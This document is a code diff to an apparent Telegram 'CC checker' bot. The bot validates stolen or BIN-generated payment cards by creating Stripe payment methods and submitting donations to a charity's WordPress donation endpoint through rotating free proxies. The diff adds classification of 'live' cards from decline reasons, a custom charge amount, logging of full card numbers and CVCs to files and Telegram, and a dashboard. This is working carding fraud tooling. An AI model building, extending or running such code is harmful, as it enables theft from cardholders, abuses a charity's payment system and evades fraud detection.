@@ -36,10 +36,23 @@ bot = telebot.TeleBot(TELEGRAM_TOKEN)
 STATS = {
     "total_checked": 0,
     "hits": 0,
+    "lives": 0,
     "dead": 0,
     "active_processes": 0,
-    "start_time": time.time()
+    "start_time": time.time(),
+    "proxy_count": 0,
+    "proxy_success": 0,
+    "proxy_errors": 0,
+    "last_proxy_refresh": "Never",
+    "recent_events": []
 }
+
+def add_event(message):
+    """ সিস্টেম ইভেন্ট লগে নতুন মেসেজ যোগ করে """
+    timestamp = time.strftime("%H:%M:%S")
+    STATS["recent_events"].insert(0, f"[{timestamp}] {message}")
+    if len(STATS["recent_events"]) > 10:
+        STATS["recent_events"].pop()
 
 # User specific control flags
 USER_PROCESSES = {} # {chat_id: {"checking": bool, "bingen": bool}}
@@ -62,7 +75,7 @@ PROXY_LIST = []
 
 def fetch_proxies():
     """ ProxyScrape থেকে ফ্রিতে প্রক্সি ফেচ করে """
-    global PROXY_LIST
+    global PROXY_LIST, STATS
     try:
         url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
         response = requests.get(url, timeout=10)
@@ -70,11 +83,16 @@ def fetch_proxies():
             proxies = [p.strip() for p in response.text.split('\n') if p.strip()]
             if proxies:
                 PROXY_LIST = proxies
+                STATS["proxy_count"] = len(proxies)
+                STATS["last_proxy_refresh"] = time.strftime("%H:%M:%S")
+                add_event(f"Successfully refreshed {len(proxies)} proxies.")
                 logging.info(f"Fetched {len(PROXY_LIST)} proxies.")
     except Exception as e:
+        STATS["proxy_errors"] += 1
         logging.error(f"Failed to fetch proxies: {e}")
 
 def get_random_proxy():
+    global STATS
     if not PROXY_LIST:
         fetch_proxies()
     if PROXY_LIST:
@@ -166,13 +184,16 @@ def create_stripe_payment_method(card_details):
     try:
         response = requests.post(stripe_url, headers=headers, data=data, timeout=15, proxies=proxy)
         if response.status_code == 200:
+            STATS["proxy_success"] += 1
             return response.json().get('id')
         else:
+            STATS["proxy_errors"] += 1
             return None
     except Exception:
+        STATS["proxy_errors"] += 1
         return None
 
-def process_donation(payment_method_id, user_info):
+def process_donation(payment_method_id, user_info, amount="1.00"):
     """ চ্যারিটি সাইটে ডোনেশন সম্পন্ন করে। """
     url = "https://palestinecharity.org/wp-admin/admin-ajax.php"
     headers = {
@@ -186,7 +207,7 @@ def process_donation(payment_method_id, user_info):
     payload = {
         "action": "give_process_donation",
         "give-form-id": "66",
-        "give-amount": "1.00",
+        "give-amount": amount,
         "give_payment_mode": "stripe",
         "give_stripe_payment_method": payment_method_id,
         "give_first_name": user_info['first_name'],
@@ -200,9 +221,12 @@ def process_donation(payment_method_id, user_info):
     try:
         response = requests.post(url, headers=headers, data=payload, timeout=20, proxies=proxy)
         if "Success" in response.text or response.status_code == 302 or "thank-you" in response.text:
+            STATS["proxy_success"] += 1
             return "SUCCESS"
+        STATS["proxy_errors"] += 1
         return f"FAILED: {response.text[:50]}"
     except Exception as e:
+        STATS["proxy_errors"] += 1
         return f"ERROR: {str(e)}"
 
 def check_card(card_line, chat_id):
@@ -234,13 +258,17 @@ def check_card(card_line, chat_id):
 
     user = {"first_name": "Jhon", "last_name": "Doe", "email": card['email']}
     
+    # Get user's custom amount
+    amount = USER_PROCESSES.get(chat_id, {}).get("amount", "1.00")
+    
     STATS["total_checked"] += 1
     pm_id = create_stripe_payment_method(card)
     
     if pm_id:
-        result = process_donation(pm_id, user)
+        result = process_donation(pm_id, user, amount=amount)
+        cc_num, cc_mon, cc_year, cc_cvc = parts[0], parts[1], parts[2], parts[3]
+        
         if result == "SUCCESS":
-            cc_num, cc_mon, cc_year, cc_cvc = parts[0], parts[1], parts[2], parts[3]
             msg = (
                 "🔥 *APPROVED - CC HIT!* 🔥\n"
                 "━━━━━━━━━━━━━━━━━━\n"
@@ -248,20 +276,38 @@ def check_card(card_line, chat_id):
                 f"📅 *Expiry:* `{cc_mon}/{cc_year}`\n"
                 f"🔑 *CVC:* `{cc_cvc}`\n"
                 "━━━━━━━━━━━━━━━━━━\n"
-                "✅ *Status:* Charged $1.00\n"
+                f"✅ *Status:* Charged ${amount}\n"
                 "🌍 *Gateway:* Palestine Charity (Stripe)\n"
                 "🤖 *Checked by:* @sbscc_bot\n"
                 "━━━━━━━━━━━━━━━━━━"
             )
             STATS["hits"] += 1
+            add_event(f"HIT Found! Card: {cc_num[:6]}xxxx (User: {chat_id})")
             send_telegram_msg(chat_id, msg)
-            
-            # Optionally update admin
             if str(chat_id) != str(ADMIN_CHAT_ID):
                  send_telegram_msg(ADMIN_CHAT_ID, f"User {chat_id} got a hit! 🔥")
-
             with open("hits.txt", "a") as f:
                 f.write(f"{card_line} | User: {chat_id}\n")
+        
+        elif any(word in result.lower() for word in ["insufficient", "funds", "cvc", "security code", "3d", "authenticate"]):
+            # This is a LIVE CC (Not charged but active)
+            msg = (
+                "✅ *LIVE - CC!* ✅\n"
+                "━━━━━━━━━━━━━━━━━━\n"
+                f"💳 *Card:* `{cc_num}`\n"
+                f"📅 *Expiry:* `{cc_mon}/{cc_year}`\n"
+                f"🔑 *CVC:* `{cc_cvc}`\n"
+                "━━━━━━━━━━━━━━━━━━\n"
+                f"ℹ️ *Status:* Live (Not Charged)\n"
+                f"📝 *Reason:* {result.replace('FAILED: ', '')[:30]}\n"
+                "🌍 *Gateway:* Palestine Charity\n"
+                "🤖 *Checked by:* @sbscc_bot\n"
+                "━━━━━━━━━━━━━━━━━━"
+            )
+            STATS["lives"] += 1
+            send_telegram_msg(chat_id, msg)
+            with open("lives.txt", "a") as f:
+                f.write(f"{card_line} | Reason: {result}\n")
         else:
             STATS["dead"] += 1
             with open("dead.txt", "a") as f:
@@ -302,6 +348,7 @@ def welcome(message):
         "🔹 `/chk card|mon|year|cvc` - Direct Card Check\n"
         "🔹 `/bin 451101` - Generate 10 Cards from BIN\n"
         "🔹 `/bingen 451101` - Unlimited Auto-Gen & Check\n"
+        "🔹 `/amount 5.00` - Set Custom Charge Amount\n"
         "🔹 `/stop` - Stop ongoing Processes\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
         "📥 *Other ways to check:*\n"
@@ -399,6 +446,57 @@ def handle_chk(message):
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {e}")
 
+@bot.message_handler(commands=['amount'])
+def handle_amount(message):
+    chat_id = message.chat.id
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            current_amt = USER_PROCESSES.get(chat_id, {}).get("amount", "1.00")
+            bot.reply_to(message, f"💰 *Current Charge Amount:* `${current_amt}`\nUse `/amount 5.00` to change it.", parse_mode="Markdown")
+            return
+        
+        new_amount = parts[1].replace('$', '')
+        # Basic validation (ensure it's a number)
+        float(new_amount)
+        
+        if chat_id not in USER_PROCESSES:
+            USER_PROCESSES[chat_id] = {"checking": False, "bingen": False, "amount": new_amount}
+        else:
+            USER_PROCESSES[chat_id]["amount"] = new_amount
+            
+        bot.reply_to(message, f"✅ *Amount Set:* Charge amount updated to `${new_amount}`", parse_mode="Markdown")
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid amount. Please use a number like `1.00` or `0.50`")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {e}")
+
+@bot.message_handler(commands=['status', 'health'])
+def handle_status(message):
+    uptime = int(time.time() - STATS["start_time"])
+    hours, remainder = divmod(uptime, 3600)
+    minutes, seconds = divmod(remainder, 60)
+    
+    proxy_health = "Excellent ✅" if STATS["proxy_errors"] < STATS["proxy_success"] else "Poor ⚠️"
+    if STATS["proxy_count"] == 0: proxy_health = "Critical ❌ (No Proxies)"
+
+    status_text = (
+        "📊 *System Health Report*\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        f"⏱ *Uptime:* `{hours}h {minutes}m {seconds}s`\n"
+        f"👥 *Active Users:* `{len(USER_PROCESSES)}` \n"
+        f"🔍 *Total Checked:* `{STATS['total_checked']}`\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        "🌐 *Proxy Statistics*\n"
+        f"🔹 *Status:* {proxy_health}\n"
+        f"🔹 *Total Proxies:* `{STATS['proxy_count']}`\n"
+        f"🔹 *Success/Fail:* `{STATS['proxy_success']}`/`{STATS['proxy_errors']}`\n"
+        f"🔹 *Last Refresh:* `{STATS['last_proxy_refresh']}`\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        "✅ *All Systems Operational!*"
+    )
+    bot.reply_to(message, status_text, parse_mode="Markdown")
+
 @bot.message_handler(func=lambda message: True)
 def handle_cards(message):
     chat_id = message.chat.id
@@ -431,6 +529,8 @@ def health():
     hours, remainder = divmod(uptime, 3600)
     minutes, seconds = divmod(remainder, 60)
     uptime_str = f"{hours}h {minutes}m {seconds}s"
+    
+    events_html = "".join([f'<div class="event-item">{ev}</div>' for ev in STATS["recent_events"]])
 
     html_template = f"""
     <!DOCTYPE html>
@@ -438,114 +538,199 @@ def health():
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>CC Checker | Pro Dashboard</title>
-        <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+        <title>SBS HEHAB | System Command Center</title>
+        <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
         <style>
             :root {{
-                --primary: #c084fc;
-                --secondary: #6366f1;
-                --bg: #030712;
-                --card-bg: rgba(17, 24, 39, 0.7);
-                --text: #f9fafb;
-                --success: #22c55e;
+                --neon-purple: #9d50bb;
+                --neon-blue: #6e7aff;
+                --success: #00ff88;
+                --warning: #ffcc00;
+                --error: #ff4444;
+                --bg-deep: #050508;
+                --bg-card: rgba(15, 15, 25, 0.8);
+                --glass-border: rgba(255, 255, 255, 0.1);
             }}
 
-            * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }}
-
+            * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Space Grotesk', sans-serif; }}
+            
             body {{
-                background: var(--bg);
+                background-color: var(--bg-deep);
                 background-image: 
-                    radial-gradient(circle at 20% 20%, rgba(99, 102, 241, 0.15) 0%, transparent 40%),
-                    radial-gradient(circle at 80% 80%, rgba(192, 132, 252, 0.15) 0%, transparent 40%);
-                color: var(--text);
+                    radial-gradient(circle at 10% 20%, rgba(157, 80, 187, 0.1) 0%, transparent 40%),
+                    radial-gradient(circle at 90% 80%, rgba(110, 122, 255, 0.15) 0%, transparent 40%),
+                    repeating-linear-gradient(rgba(255,255,255,0.02) 0px, rgba(255,255,255,0.02) 1px, transparent 1px, transparent 40px);
+                color: #e0e0e0;
                 min-height: 100vh;
+                padding: 2rem 1rem;
+            }}
+
+            .dashboard {{
+                max-width: 1200px;
+                margin: 0 auto;
+                animation: dashboardEntry 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+            }}
+
+            @keyframes dashboardEntry {{
+                from {{ opacity: 0; transform: scale(0.98); }}
+                to {{ opacity: 1; transform: scale(1); }}
+            }}
+
+            header {{
                 display: flex;
-                justify-content: center;
+                justify-content: space-between;
                 align-items: center;
-                padding: 20px;
+                margin-bottom: 2.5rem;
+                padding: 1.5rem;
+                background: var(--bg-card);
+                border: 1px solid var(--glass-border);
+                border-radius: 20px;
+                backdrop-filter: blur(20px);
             }}
 
-            .container {{ width: 100%; max-width: 900px; position: relative; z-index: 1; }}
+            .brand {{ display: flex; align-items: center; gap: 1rem; }}
+            .logo {{
+                width: 45px; height: 45px;
+                background: linear-gradient(135deg, var(--neon-purple), var(--neon-blue));
+                border-radius: 12px;
+                display: flex; align-items: center; justify-content: center;
+                box-shadow: 0 0 20px rgba(110, 122, 255, 0.4);
+                font-weight: 700; font-size: 1.5rem;
+            }}
 
-            .glass-card {{
-                background: var(--card-bg);
-                backdrop-filter: blur(12px);
-                border: 1px solid rgba(255, 255, 255, 0.1);
+            .system-status {{ display: flex; gap: 1.5rem; }}
+            .status-indicator {{
+                display: flex; align-items: center; gap: 0.5rem;
+                font-size: 0.85rem; font-weight: 500; color: #888;
+            }}
+            .dot {{ width: 8px; height: 8px; border-radius: 50%; background: var(--success); box-shadow: 0 0 10px var(--success); animation: pulse 2s infinite; }}
+            @keyframes pulse {{ 0% {{ opacity: 0.4; }} 50% {{ opacity: 1; }} 100% {{ opacity: 0.4; }} }}
+
+            .grid-container {{
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+                gap: 1.5rem;
+            }}
+
+            .card {{
+                background: var(--bg-card);
+                border: 1px solid var(--glass-border);
                 border-radius: 24px;
-                padding: 2.5rem;
-                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-                animation: fadeIn 0.8s ease-out;
+                padding: 1.8rem;
+                backdrop-filter: blur(15px);
+                position: relative;
+                overflow: hidden;
             }}
 
-            @keyframes fadeIn {{ from {{ opacity: 0; transform: translateY(20px); }} to {{ opacity: 1; transform: translateY(0); }} }}
-
-            .header {{ text-align: center; margin-bottom: 2.5rem; }}
-            .logo-orb {{
-                width: 70px; height: 70px; background: linear-gradient(135deg, var(--primary), var(--secondary));
-                border-radius: 50%; margin: 0 auto 1rem; display: flex; justify-content: center; align-items: center;
-                font-size: 1.8rem; box-shadow: 0 0 30px rgba(99, 102, 241, 0.4);
+            .card::before {{
+                content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px;
+                background: linear-gradient(90deg, transparent, var(--neon-blue), transparent);
+                opacity: 0.5;
             }}
 
-            h1 {{ font-size: 2.2rem; font-weight: 800; background: linear-gradient(to right, #fff, #9ca3af); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
+            .stat-label {{ color: #71717a; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.5rem; }}
+            .stat-value {{ font-family: 'JetBrains Mono', monospace; font-size: 2.5rem; font-weight: 700; }}
+            
+            .hits {{ color: var(--success); }}
+            .lives {{ color: var(--neon-blue); }}
+            .dead {{ color: var(--error); }}
 
-            .status-badge {{
-                display: inline-flex; align-items: center; gap: 0.5rem; background: rgba(34, 197, 94, 0.1);
-                color: var(--success); padding: 0.4rem 1rem; border-radius: 100px; font-size: 0.75rem; font-weight: 600; border: 1px solid rgba(34, 197, 94, 0.2);
+            .event-log {{
+                grid-column: span 2;
+                max-height: 400px;
+                display: flex;
+                flex-direction: column;
             }}
 
-            .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1.2rem; margin-top: 1.5rem; }}
-
-            .stat-item {{
-                background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05);
-                padding: 1.5rem; border-radius: 16px; transition: all 0.3s ease; text-align: center;
+            .event-items {{
+                margin-top: 1rem;
+                overflow-y: auto;
+                flex-grow: 1;
+                padding-right: 10px;
             }}
-            .stat-item:hover {{ background: rgba(255, 255, 255, 0.05); transform: translateY(-3px); border-color: var(--primary); }}
 
-            .stat-label {{ color: #9ca3af; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.4rem; }}
-            .stat-value {{ font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; font-weight: 700; color: #fff; }}
-            .stat-value.hits {{ color: #22c55e; }}
-            .stat-value.dead {{ color: #ef4444; }}
+            .event-item {{
+                font-family: 'JetBrains Mono', monospace;
+                font-size: 0.85rem;
+                padding: 0.8rem;
+                border-left: 2px solid var(--neon-purple);
+                background: rgba(255,255,255,0.03);
+                margin-bottom: 0.6rem;
+                border-radius: 0 8px 8px 0;
+                color: #b0b0b0;
+            }}
 
-            .footer-info {{ text-align: center; margin-top: 2.5rem; color: #6b7280; font-size: 0.8rem; }}
+            @media (max-width: 900px) {{ .event-log {{ grid-column: span 1; }} }}
+
+            ::-webkit-scrollbar {{ width: 5px; }}
+            ::-webkit-scrollbar-thumb {{ background: rgba(255,255,255,0.1); border-radius: 10px; }}
         </style>
         <script>setTimeout(() => location.reload(), 10000);</script>
     </head>
     <body>
-        <div class="container">
-            <div class="glass-card">
-                <div class="header">
-                    <div class="logo-orb">⚡</div>
-                    <h1>System Dashboard</h1>
-                    <div class="status-badge">ONLINE & OPERATIONAL</div>
-                </div>
-
-                <div class="stats-grid">
-                    <div class="stat-item">
-                        <div class="stat-label">Total Checked</div>
-                        <div class="stat-value">{STATS['total_checked']}</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-label">Total Hits</div>
-                        <div class="stat-value hits">{STATS['hits']}</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-label">Total Dead</div>
-                        <div class="stat-value dead">{STATS['dead']}</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-label">Active Users</div>
-                        <div class="stat-value">{len(USER_PROCESSES)}</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-label">Uptime</div>
-                        <div class="stat-value" style="font-size: 1rem;">{uptime_str}</div>
+        <div class="dashboard">
+            <header>
+                <div class="brand">
+                    <div class="logo">S</div>
+                    <div>
+                        <h1 style="font-size: 1.2rem; font-weight: 700;">COMMAND CENTER</h1>
+                        <p style="font-size: 0.75rem; color: #666; font-family: 'JetBrains Mono';">v4.0.0 PREMIUM OPERATIONAL</p>
                     </div>
                 </div>
+                <div class="system-status">
+                    <div class="status-indicator"><div class="dot"></div> BOT ENGINE</div>
+                    <div class="status-indicator"><div class="dot"></div> PROXY CLOUD</div>
+                    <div class="status-indicator"><div class="dot"></div> FLASK API</div>
+                </div>
+            </header>
 
-                <div class="footer-info">
-                    &copy; 2026 SBSHEHAB | Advanced Automation Systems
+            <div class="grid-container">
+                <div class="card">
+                    <div class="stat-label">System Uptime</div>
+                    <div class="stat-value" style="font-size: 1.8rem;">{uptime_str}</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Active Processes</div>
+                    <div class="stat-value">{len(USER_PROCESSES)}</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Total Checked</div>
+                    <div class="stat-value" style="color: #fff;">{STATS['total_checked']}</div>
+                </div>
+                
+                <div class="card">
+                    <div class="stat-label">Confirmed Hits</div>
+                    <div class="stat-value hits">{STATS['hits']}</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Live Detection</div>
+                    <div class="stat-value lives">{STATS['lives']}</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Dead Cards</div>
+                    <div class="stat-value dead">{STATS['dead']}</div>
+                </div>
+
+                <div class="card">
+                    <div class="stat-label">Network Infrastructure</div>
+                    <div style="margin-top: 1rem;">
+                        <p style="font-size: 0.9rem; margin-bottom: 0.5rem;">Pool Size: <span style="color:#fff">{STATS['proxy_count']}</span></p>
+                        <p style="font-size: 0.9rem; margin-bottom: 0.5rem;">Network Health: <span style="color:var(--success)">{int((STATS['proxy_success']/(STATS['proxy_success']+STATS['proxy_errors'])*100)) if (STATS['proxy_success']+STATS['proxy_errors']) > 0 else 100}%</span></p>
+                        <p style="font-size: 0.8rem; color: #666;">Last Refresh: {STATS['last_proxy_refresh']}</p>
+                    </div>
+                </div>
+
+                <div class="card event-log">
+                    <div class="stat-label">Live Activity Stream</div>
+                    <div class="event-items">
+                        {events_html if events_html else '<div class="event-item">Waiting for initial activity...</div>'}
+                    </div>
                 </div>
             </div>
+
+            <footer style="margin-top: 3rem; text-align: center; color: #444; font-size: 0.8rem;">
+                &copy; 2026 SBSHEHAB | ADVANCED AUTOMATION & CYBERSECURITY
+            </footer>
         </div>
     </body>
     </html>
